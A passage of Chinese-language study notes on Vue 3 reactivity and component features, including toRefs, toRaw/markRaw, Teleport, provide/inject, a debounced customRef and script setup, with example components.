所以最终原理是这样：通过 toRef 将目标对象 data 中的属性 counter1 转换成一个 ObejctRefImpl 对象，该对象是一个引用对象，具有相应式，然后将该对象赋值给 counter1 再 return 出去，就在模板语法中可以使用 counter1 这个变量，当访问或修改 counter1 变量时，就会执行 ObjectRefImpl 对象中的 get 和 set 方法，从而修改到目标对象 data 的 counter1 属性。

### toRefs

以上关键代码使用 toRef 写是这样：

```js
return {
    counter1: toRef(data, "counter1"),
    counter2: toRef(data, "counter2"),
    counter3: toRef(data.a.b, "counter3"),
};
```

会发现其实有很多地方是重复的。toRefs 可以自动生成这些代码。

toRefs 的语法：

```js
toRefs(对象)
```

可以输出一下 toRefs 函数生成的对象：

```js
console.log(toRefs(data));
```

![image-20240505195550707](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405051955101.png)

可以看到，toRefs 将 data 的三个一级属性都好了响应式，就不需要我们自己再写了，所以可以将使用 toRef 写的代码改成这样：

```js
return {
    ...toRefs(data),
};
```

+ 注意：要使用扩展运算符将 toRefs 生成的对象中的属性解析出来，没有这种写法：

  ```js
  return {
      toRefs(data),
  };
  等价于：
  return {
      {
      	a:
      	counter1:
  	}
  }
  ```

使用 toRefs 后，在模板语句中，就不需要写一级属性的前缀了：

```vue
<template>
    <h2>{{ data }}</h2>
    <h2></h2>
    <h2>计数器：{{ counter1 }}</h2>
    <button @click="counter1++">点我加1</button>
    <hr />
    <h2>计数器：{{ counter2 }}</h2>
    <button @click="counter2++">点我加1</button>
    <hr />
    <h2>计数器：{{ a.b.counter3 }}</h2>
    <button @click="a.b.counter3++">点我加1</button>
</template>
```

![image-20240505200007376](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405052000792.png)

## 转换为原始&标记为原始

toRaw：将响应式对象转换为普通对象。只适用于 reactive 生成的响应式对象。

markRaw：标记某个对象，让这个对象永远都不具备响应式。比如在集成一些第三方库的时候，比如有一个巨大的只读列表，不让其具备响应式是一种性能优化。

### toRow

假如有一个 data 对象是响应式对象：

```vue
<template>
    <h2>计数器：{{ counter1 }}</h2>
    <button @click="counter1++">点我加1</button>
</template>

<script>
import { reactive, toRefs } from "vue";
export default {
    name: "App",
    setup() {
        let data = reactive({
            counter1: 1,
        });

        return {
            ...toRefs(data),
        };
    },
};
</script>
```

到后期处理业务的时候，可能需要处理 data 数据，但是又不需要 data 有响应式，所以就需要使用 toRow 获取 data 的没有响应式的原始对象，操作原始对象时是没有响应式的：

```js
function getRawObj() {
    let rawObj = toRaw(data);
    rawObj.counter1++;
    console.log(rawObj);
}
```

输出的原始对象是：

![image-20240505202309724](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405052023207.png)

虽然没有响应式，但是此时 data 中的 counter1 的 值也已经不是 1 了，因为这个原始对象也关联了 data 这个对象，相当于用的是同一个 counter1，只不过修改原始对象是不会有响应式处理。

如果这个时候点击 +1 按钮，就不会是 2 了，因为操作原始对象时就已经加了很多次了：

![image-20240505202536024](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405052025470.png)

+ 操作原始对象让 counter1 变为了 12，在操作响应式对象加 1 就让 counter1 变成了 13，且渲染到了页面上

### markRow

现在新加一个按钮，点击就给 data 添加一个属性 x，x 是一个对象：

```vue
<button @click="addX">添加x属性</button>
```

```js
function addX() {
    data.x = {
        counter2: 100,
    };
}
```

这个加的 x 属性也是有响应式的，现在想这个扩展的属性没有响应式，使用 markRaw：

```js
function addX() {
    data.x = markRaw({
        counter2: 100,
    });
}
```

这个 x 属性就不会有响应式。

## Fragment组件

Vue3 新增的组件。

fragment 翻译为：碎片。片段。

在 Vue2 中每个组件必须有一个根标签。这样性能方面稍微有点问题，如果每一个组件必须有根标签，组件嵌套组件的时候，有很多无用的根标签。

在 Vue3 中每个组件不需要有根标签。实际上内部实现的时候，最终将所有组件嵌套好之后，最外层会添加一个 Fragment，用这个 fragment 当做根标签。这是一种性能优化策略。

## Teleport组件

teleport 翻译为：远距离传送。用于设置组件的显示位置。

现有组件 App：

```vue
<template>
  <div class="s1">
    <h2>我是App组件</h2>
    <YeYe></YeYe>
  </div>
</template>

<script>
  import YeYe from './components/YeYe.vue'
  export default {
    name : 'App',
    components : {YeYe}
  }
</script>

<style lang="css" scoped>
  .s1 {
    width: 500px;
    height: 500px;
    background-color: aquamarine;
  }
</style>
```

YeYe 组件

```vue
<template>
    <div class="s2">
        <h2>我是爷爷组件</h2>
        <ErZi></ErZi>
    </div>
</template>

<script>
    import ErZi from './ErZi.vue'
    export default {
        name : 'YeYe',
        components : {ErZi}
    }
</script>

<style lang="css" scoped>
    .s2 {
        width: 400px;
        height: 400px;
        background-color: bisque;
    }
</style>
```

ErZi 组件

```vue
<template>
    <div class="s3">
        <h2>我是儿子组件</h2>
        <SunZi></SunZi>
    </div>
</template>

<script>
    import SunZi from './SunZi.vue'
    export default {
        name : 'ErZi',
        components : {SunZi}
    }
</script>

<style lang="css" scoped>
    .s3 {
        width: 300px;
        height: 300px;
        background-color:chartreuse;
    }
</style>
```

SunZi 组件

```vue
<template>
    <div class="s4">
        <h2>我是孙子组件</h2>
        <button @click="isShow = true">弹窗</button>
        <div v-show="isShow" class="s">
            我是一个窗口.....
            <button @click="isShow = false">关闭</button>
        </div>
    </div>
</template>

<script>
import { ref } from "vue";
export default {
    name: "SunZi",
    setup() {
        // data
        let isShow = ref(false);
        // 返回一个对象
        return { isShow };
    },
};
</script>

<style lang="css" scoped>
.s4 {
    width: 200px;
    height: 200px;
    background-color: darkmagenta;
}
.s {
    width: 250px;
    height: 250px;
    background-color: cadetblue;
}
</style>
```

现在弹窗的效果：

![image-20240505204258720](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405052042186.png)

查看该弹窗的所在位置：

![image-20240505204524287](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405052045848.png)

现在想对这个窗口进行定位，这个窗口有很多个父标签，如果窗口采用绝对定位的话，就需要参照物，如果参照物突然发生了改变，那么该窗口的位置也会产生混乱，为了稳定该窗口的定位，最好要将该窗口不放在这些父级元素当中。

直接将该元素交给 body，这样的话其他元素不管怎么变都不会影响到该元素的位置，那怎么将这个窗口的 div 放到 body 里面呢？就需要使用 teleport 组件。

可以将这个窗口变成一个模态窗口（窗口弹出后，窗口外的部分会有种灰色的、被遮住的感觉，点这些位置页面不会有反应），在 SunZi 组件中：

```vue
<!-- 遮罩层，一会整个遮罩层要瞬移到body下面 -->
<div v-show="isShow" class="cover">
    <!-- 模态窗口 -->
    <div class="s">
        我是一个窗口.....
        <button @click="isShow = false">关闭</button>
    </div>
</div>
```

样式：

```css
.cover {
    position: absolute;
    top: 0; bottom: 0; left: 0; right: 0;
    /* opacity: 90%; */
    background-color: darkgrey;
}
```

然后将这个模态窗口瞬移到 body 下：

```vue
<teleport to='body'>
    <!-- 遮罩层，一会整个遮罩层要瞬移到body下面 -->
    <div v-show="isShow" class="cover">
        <!-- 模态窗口 -->
        <div class="s">
            我是一个窗口.....
            <button @click="isShow = false">关闭</button>
        </div>
    </div>
</teleport>
```

+ teleport 的 to 后可以使用选择器来指定元素

加了 teleport 后，再查看这个弹窗 div 的位置，已经在 body 下了：

![image-20240505205338892](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405052053382.png)

打开窗口后是这样：

![image-20240505205411361](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405052054862.png)

## 隔代数据传递

之前学的，父向子传数据：

+ props
+ 事件
+ 全局事件总线

兄弟之间传数据：全局事件总线

子向父传数据：

+ 事件
+ 全局事件总线

Vue3 提供了两个函数专门来完成祖宗组件给后代组件传递数据：

+ provide
+ inject

用来完成组件之间数据的传递，组件之间的通信。

在祖宗组件中使用 provide 提供数据，在后代组件中使用 inject 完成数据的注入。这种方式比较适合使用在祖宗给后代组件传递数据的情况。

provide 语法：

```js
provide('名字', 数据)
```

inject 语法：

```js
inject('名字')
```

YeYe 组件：

```vue
<script>
    import {provide, ref} from 'vue'
    import ErZi from './ErZi.vue'
    export default {
        name : 'YeYe',
        components : {ErZi},
        setup(){
            let counter = ref(1)
            
            // 在祖宗组件中使用provide提供数据
            provide('c', counter)

            return {counter}
        }
    }
</script>
```

SunZi 组件：

```vue
<script>
    import {ref, inject} from 'vue'
    export default {
        name : 'SunZi',
        setup(){
            // data
            let isShow = ref(false)
            // 注入inject
            let counter = inject('c')
            // 返回一个对象
            return {isShow, counter}
        }
    }
</script>
```

## watch实现延迟显示

在一个文本框中输入数据，一秒后再显示这个数据。

```vue
<template>
  <input type="text" v-model="name">
  <br><br>
  {{newName}}
</template>

<script>
  import {ref, watch} from 'vue'
  export default {
    name : 'App',
    setup(){
      // data
      let name = ref('')
      let newName = ref(name.value)
      // 侦听属性
      watch(name, (newValue, oldValue) => {
        setTimeout(() => {
          newName.value = newValue
        }, 300)
      })
      // 返回一个对象
      return {name, newName}
    }
  }
</script>
```

## 自定义ref实现延迟显示

官方教程：https://cn.vuejs.org/api/reactivity-advanced.html#customref

ref 是一个函数，像这种函数是可以程序员自定义的，自定义的 ref 也具有响应式。

自定义 ref 也是调用 Vue 提供的 API 接口来自定义，只需要照着模板写

```vue
<script>
import { ref, customRef } from "vue";
export default {
    name: "App",
    setup() {
        // 使用Vue3内置的ref
        //let name = ref('test')

        // 创建一个防抖 ref
        // 以下这个代码就是真正的属于自己定义的ref了。
        // ref是一个函数，那么我们自定义的ref同样是一个函数。
        function useDebouncedRef(value) {
            let t;
            // 自定义的ref这个函数体当中的代码不能随便写，必须符合ref规范。
            // 通过调用customRef函数来获取一个自定义的ref对象。
            // 调用customRef函数的时候必须给该函数传递一个回调：这个回调可以叫做factory
            // 对于这个回调函数来说，有两个非常重要的参数：track是追踪。trigger是触发。
            const x = customRef((track, trigger) => {
                // 对于这个factory回调来说，必须返回一个对象，并且对象中要有get
                return {
                    // 模板语句中只要使用到该数据，get会自动调用。
                    get() {
                        console.log("get执行了");
                        // 告诉Vue去追踪这个value的变化
                        track();
                        return value;
                    },
                    // 当模板语句中修改该数据的时候，set会自动调用。
                    set(newValue) {
                        console.log("set执行了", newValue);
                        clearTimeout(t);
                        t = setTimeout(() => {
                            value = newValue;
                            // 触发(通知去调用get方法)
                            trigger();
                        }, 1000);
                    },
                };
            });

            // 返回自定义的ref对象实例。
            return x;
        }

        // 使用自定义的ref同样具备响应式。
        let name = useDebouncedRef("test");

        // 返回一个对象
        return { name };
    },
};
</script>
```

## 语法糖

关于 setup 的语法糖：

```vue
<script setup>

</script>
```

这样就不需要写 setup 函数了，他会自动将 script 中的一级数据全部导出去，另外注册组件也只需要导入即可：

```vue
<template>
  <h2>计数器：{{counter}}</h2>
  <button @click="add">计数器加1</button>
  <hr>
  <User></User>
</template>

<script setup>
  import {ref} from 'vue'
  import User from './components/User.vue'

  // data
  let counter = ref(0)

  // methods
  function add(){
    counter.value++
  }

  // watch

  // computed

  // ....
</script>
```

